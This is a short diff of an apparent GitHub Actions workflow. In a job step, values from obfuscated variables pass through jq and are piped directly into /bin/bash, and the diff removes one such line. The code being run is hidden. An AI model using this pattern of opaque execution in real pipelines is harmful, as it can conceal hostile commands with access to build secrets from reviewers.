@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$mswmy04" | jq -r .d7853 | /bin/bash
           echo $zr23 | jq -r .oswfj8035 | /bin/bash
           echo $byzaa19 | jq -r .g15851 | /bin/bash
-          printf '%s' "$de451" | jq -r .oikl375 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
